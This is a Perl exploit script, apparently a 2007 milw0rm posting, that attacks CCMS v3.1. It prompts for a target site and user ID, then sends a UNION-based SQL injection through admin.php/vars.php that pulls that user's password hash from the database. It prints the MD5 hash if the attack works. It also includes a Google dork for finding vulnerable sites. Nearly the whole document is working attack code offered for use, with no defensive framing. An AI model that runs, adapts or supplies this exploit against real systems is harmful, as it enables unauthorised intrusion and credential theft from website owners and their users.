#!/usr/bin/perl
#Found by Pr0metheuS
#Coded by Pr0metheuS
#Gr33tz-Team
#Dork : intitle:"CCMS v3.1 Demo PW"
print "______________________________________\n";
print "-=-=-=-=-=-=+-=-=-=-=-=-=-+-=-=-=-=-=|\n";
print "-=-=-=-=-=-=+CCMS Exploit...+-=-=-=-=|\n";
print "-=-=-=-=-=-=+Remote MD5 Hash+-=-=-=-=|\n";
print "-=-=-=-=-=-=+By Pr0metheus..+-=-=-=-=|\n";
print "-=-=-=-=-=-=+Gr33tz to :+-=-=-=-=|\n";
print "-=-=-=-=-=-=+pawel2827, d3d!k, J4Z0, chez, fir3+-=-=-=-=|\n";
print "______________________________________\n";
print "[+] Enter SITE:\n";
$SITE = <STDIN>;
chomp $SITE;
print "[+] Enter PATH:\n";
$PATH = <STDIN>;
chomp $PATH;
print "[+] Enter USERID:\n";
$USERID = <STDIN>;
chomp $USERID;
print "______________________________________\n";
#Send Request
use LWP::UserAgent;
$ua = new LWP::UserAgent;
$ua->agent("Mozilla/8.0");
$ua = LWP::UserAgent->new;
my $req = HTTP::Request->new(GET => "$SITE$PATH/admin.php/vars.php?page=Console&p=1'+union+select+userid,2,3,PASSWORD+from+user+where+userid=$USERID/*");
$req->header('Accept' => 'text/html');
$res = $ua->request($req);
$con = $res->content;
#FIND MD5 IN TEXT REGEX !!!
if ($con =~ "/([0-9a-fA-F]{32})/") {
print "______________________________________\n";
print "-=-=-=-=-=-=+-=-=-=-=-=-=-+-=-=-=-=-=|\n";
print "-=-=-=-=-=-=+CCMS Exploit...+-=-=-=-=|\n";
print "-=-=-=-=-=-=+Remote MD5 Hash+-=-=-=-=|\n";
print "-=-=-=-=-=-=+By Pr0metheus..+-=-=-=-=|\n";
print "-=-=-=-=-=-=+Gr33tz to :+-=-=-=-=|\n";
print "-=-=-=-=-=-=+pawel2827, d3d!k, J4Z0, chez, fir3+-=-=-=-=|\n";
print "[+] Exploit successful!\n";
print "[+] USERID:$USERID\n";
print "[+] MD5:$1\n";
print "______________________________________\n";
}
else{
print "______________________________________\n";
print "-=-=-=-=-=-=+-=-=-=-=-=-=-+-=-=-=-=-=|\n";
print "-=-=-=-=-=-=+CCMS Exploit...+-=-=-=-=|\n";
print "-=-=-=-=-=-=+Remote MD5 Hash+-=-=-=-=|\n";
print "-=-=-=-=-=-=+By Pr0metheus..+-=-=-=-=|\n";
print "-=-=-=-=-=-=+Gr33tz to :+-=-=-=-=|\n";
print "-=-=-=-=-=-=+pawel2827, d3d!k, J4Z0, chez, fir3+-=-=-=-=|\n";
    print "[+] Exploit Failed!\n";
}

# milw0rm.com [2007-12-29]